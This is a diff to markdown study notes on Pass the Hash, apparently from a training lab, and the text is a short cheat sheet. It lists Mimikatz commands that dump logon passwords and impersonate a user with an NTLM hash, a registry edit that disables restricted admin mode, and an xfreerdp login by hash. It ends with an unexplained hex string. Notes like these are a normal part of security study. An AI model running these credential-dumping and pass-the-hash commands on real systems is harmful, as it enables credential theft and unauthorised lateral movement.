@@ -1,6 +1,10 @@
 ### Tools used for Pass the Hash
 #### Mimikatz
 * ```bash
+  
+  mimikatz.exe 
+  privilege::debug
+  sekurlsa::logonpasswords
   mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
   ```
   * The goal is to impersonate `/user`, running on `/domain`, and using the `/rc4` hash.
@@ -44,3 +48,6 @@ In order to access this you need to turn off the restricted admin mode!
 `C:\reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
 Then one can use the `xfreerdp3` command.
 `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`
+
+
+c39f2beb3d2ec06a62cb887fb391dee0
